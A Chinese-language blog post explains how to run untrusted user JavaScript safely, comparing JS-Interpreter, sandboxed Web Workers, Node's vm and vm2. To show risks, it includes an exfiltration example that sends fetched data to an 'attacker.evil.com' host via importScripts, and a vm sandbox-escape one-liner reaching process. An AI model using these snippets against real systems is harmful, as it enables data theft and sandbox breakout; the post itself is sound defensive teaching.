---
title: 如何安全地运行用户的 JavaScript 脚本
category: JavaScript
tag: JavaScript, Security
permalink: safely-run-user-javascript
---

有时候我们需要运行用户输入的 JavaScript 脚本（以下简称脚本）。对于我们来说，这些脚本是不可信任的，如果在当前的 Context 中运行这些脚本，它们就能获取到像 cookie、localStorage、DOM 元素等隐私数据，会有潜在的安全问题。

本文所说的用户脚本，是指用户在文本框中输入的 JavaScript 代码，也就是一些代码字符串，我们假设它们只需要做一些计算，不需要访问用户数据。

下面我们来看一下如何在浏览器和 Node.js 中安全地运行上述这种不可信任的用户脚本。

## 浏览器

`eval` 和 `new Function` 这两个方法会在当前的 Context 中运行，它们可以访问 cookie 等隐私数据，所以不能使用这两个方法：

```js
const cookie = eval('document.cookie');
const getCookie = new Function('return document.cookie');
```

这里需要强调下，是因为`eval` 和 `new Function` 能访问 cookie 等隐私数据所以才不能使用它们，并不是因为它们在当前的 Context 中运行而不能使用它们，如果它们在当前的 Context 中运行，但不能访问任何隐私数据，也是可以放心地使用它们的。

所以，我们要将用户脚本放到沙箱（Sandbox）中去运行，同时不能让它们访问任何用户数据，比如 cookie、localStorage、JavaScript 全局变量、DOM 元素等。

#### 解释器

一种方案是使用 JavaScript 解释器，比如 [JS-Interpreter](https://github.com/NeilFraser/JS-Interpreter)。我们来看一下 JS-Interpreter 的用法，首先在页面中引入 [acorn_interpreter.js](https://raw.githubusercontent.com/NeilFraser/JS-Interpreter/master/acorn_interpreter.js) 这个文件，然后可以按照下面的形式使用：

```js
const code = '1 + 2';
const interpreter = new Interpreter(code);
interpreter.run();
console.log(interpreter.value); // 3
```

下面来验证一下是否能访问用户数据：

```js
const globalVar = 'x';
const code = 'globalVar';
const interpreter = new Interpreter(code);
interpreter.run();
console.log(interpreter.value); // globalVar is not defined
```

`globalVar` 是一个全局变量，用户脚本无法访问这个全局变量。同时不难验证，`cookie`、`localStorage`、`document`、`XMLHttpRequest` 等对象用户脚本都是无法访问的，不过有 `window` 对象，虽然和浏览器中的 `window` 不是同个对象。

>注意，上述代码只是在论证用户脚本的能力，并不是在讨论 JS-Interpreter 本身能做什么事情，JS-Interpreter 可以通过 `createNativeFunction` 等方法去调用系统方法，运行下面的代码后，会弹窗显示当前页面的 URL 地址：

```js
var myCode = 'alert(url);';
var initFunc = function (interpreter, scope) {
  interpreter.setProperty(scope, 'url', String(location));

  var wrapper = function (text) {
    return alert(text);
  };
  interpreter.setProperty(scope, 'alert',
    interpreter.createNativeFunction(wrapper));
};
var myInterpreter = new Interpreter(myCode, initFunc);
myInterpreter.run();
```

据官方文档说明，JS-Interpreter 目前还未收到安全漏洞问题，但有以下使用限制：

- 不能访问 DOM。
- 不支持 ES6，只支持 ES5。
- 不支持自定义的 toString 和 valueOf 方法。
- 性能比原生的低 200 倍左右。

如果上述限制对要实现的功能没有影响，对引入额外文件的成本也可以忽略的话，我觉得是值得尝试使用的。

#### Web Worker

另外一种是使用 Web Worker，也有相应的封装实现，比如这个库 [jailed](https://github.com/asvd/jailed)，它在 Node.js 和浏览器中都可以使用，不过在 Node.js 中的实现有安全问题，就不具体介绍了。在浏览器中，它的做法是：

- 创建一个[沙箱中的 iframe](https://www.html5rocks.com/en/tutorials/security/sandboxed-iframes/)，并将 iframe 的 `sandbox` 属性设置为 `allow-scripts`，目的是让 iframe 遵循 [CSP（Content Security Policy）](https://www.html5rocks.com/en/tutorials/security/content-security-policy/)规则。
- 在 iframe 启动 Web Worker。
- 在 Web Worker 中加载并运行代码。

我们先来看一下如何使用 Web Worker 来运行用户脚本。根据 [Worker](https://developer.mozilla.org/en-US/docs/Web/API/Worker/Worker) 的文档，第一个参数是脚本的地址。但我们今天讨论的问题是用户输入的脚本代码，它是一段字符串，并不是一个文件。所以需要想办法将字符串代码转换成文件，使用 [Blob](https://developer.mozilla.org/en/docs/Web/API/Blob) 就可以了：

```html
<script id="worker" type="javascript/worker">
  self.onmessage = function(e) {
    console.log(`data from parent: ${e.data}`);
    const result = eval(e.data);
    self.postMessage(`data from worker: ${result}`);
  };
</script>
<script>
  const blob = new Blob([
    document.querySelector('#worker').textContent
  ]);

  const worker = new Worker(window.URL.createObjectURL(blob));
  worker.onmessage = function(e) {
    console.log(`${e.data}`);
  };
  // 发送用户脚本，这里是 `1 + 2`
  worker.postMessage(`1 + 2;`);
</script>
```

上面的示例，我们为了要运行用户脚本 `1 + 2`，把它传给了 Worker，然后在 Worker 中使用 eval 方法求值，所以现在的安全问题已经转嫁给 Worker 了。在 Worker 中，可以使用`fetch`、`XMLHttpRequest`等对象，这会有潜在的安全问题，比如攻击者在用户脚本中请求当前域的数据，然后再发送给攻击者的服务器：

```js
// 将上面的用户脚本 `1 + 2` 换成下面的脚本
fetch('secure.json')
.then(function(response) {
  return response.json();
})
.then(function(json) {
  importScripts('https://attacker.evil.com/' + JSON.stringify(json));
});
```

因此，需要将 Worker 放到 iframe 中，并将 iframe 的 `sandbox` 属性设置为 `allow-scripts`，也就是只允许执行脚本，本域的资源也不能加载：

```html
<!-- 将上面的 worker 代码放在 iframe.html 页面中 -->
<iframe src="iframe.html" sandbox="allow-scripts"></iframe>
```

此外，还要防止用户代码中出现计算量过大或者死循环等问题，它们会导致用户的浏览器被卡死。Worker 本身并没有`超时`这样的参数，不过它有一个 `terminate` 方法可以用来结束它的运行，所以可以使用一个计时器，在指定的时间内如果主线程没有收到数据，就认为可以结束 Worker 的运行了，至于没有收到数据的原因，可能是用户脚本中出现了死循环、语法错误等原因：

```js
const blob = new Blob([
  document.querySelector('#worker').textContent
]);

const worker = new Worker(window.URL.createObjectURL(blob));
let receivedFromWorker = false;
worker.onmessage = function(e) {
  receivedFromWorker = true;
  console.log(`${e.data}`);
};
worker.postMessage(`
  while(true) {
    console.log(1);
  }
`);
setTimeout(function () {
  if (!receivedFromWorker) {
    console.log('运行时间过长，结束 Worker');
    worker.terminate();
  }
}, 100);
```

Worker 是浏览器原生支持的，不需要引入额外的文件，是优先推荐使用的方法。

## Node.js

在 Node.js 中，`eval` 和 `new Function` 这两个方法也是在当前的 Context 中运行，所以也不能使用这两个方法：

```js
eval('process.exit(0)');
```

和在浏览器中一样，也需要把代码放到隔离的沙箱中去运行。

#### VM

Node.js 有一个 [vm](https://nodejs.org/api/vm.html) 模块，它可以在 V8 虚拟机中编译和执行代码，它是和当前执行环境隔离的沙箱环境，其中没有 `process`、`console`、`fs` 等全局对象：

```js
const vm = require('vm');
let result = vm.runInNewContext('1 + 2');
console.log(result); // 3

// ReferenceError: process is not defined
vm.runInNewContext('process.exit(0)');
```

也可以指定超时执行时间：

```js
const vm = require('vm');

// Error: Script execution timed out.
vm.runInNewContext(`while (true) 1`, {}, {timeout: 3});
```

那是否就可以直接使用这个 `vm` 模块来执行不可信任的用户脚本呢？很遗憾，不可以。官方文档中也明确地强调不能这么做：

> **The vm module is not a security mechanism. Do not use it to run untrusted code.**（**vm 模块的机制不安全，别用它来运行不可信任的代码。**）

下面这个例子可以说明问题：

```js
const vm = require('vm');
vm.runInNewContext('this.constructor.constructor("return process")().exit()');
console.log('Never gets executed.');
```

#### VM2

由于 vm 存在的一些问题，有人写了一个 vm 的进化版本，叫 [vm2](https://github.com/patriksimek/vm2)，上面的例子是可以解决了：

```js
const {VM} = require('vm2');
// ReferenceError: process is not defined
new VM().run('this.constructor.constructor("return process")().exit()');
```

vm2 内部也是调用了 vm，它使用了 [Proxy](https://developer.mozilla.org/docs/Web/JavaScript/Reference/Global_Objects/Proxy) 来防止访问沙箱外的东西，并且覆写了内置的 `require` 命令，对一些内置对象做了访问限制。

但我们不能认为它是绝对安全的，比如从这个[issue](https://github.com/patriksimek/vm2/issues/32)，我们可以看出 vm2 本身也是不断地在进化中。目前没有发现安全问题并不能说明不存在安全问题。

## 小结

到目前为止，不管是浏览器还是 Node.js，都没有官方推出的功能，可以保证安全地执行不可信任的用户脚本。但都有一些相应的方案，可以有条件地使用。

安全问题从来不可忽视，因为没人可以保证他写出来的代码没有 bug。
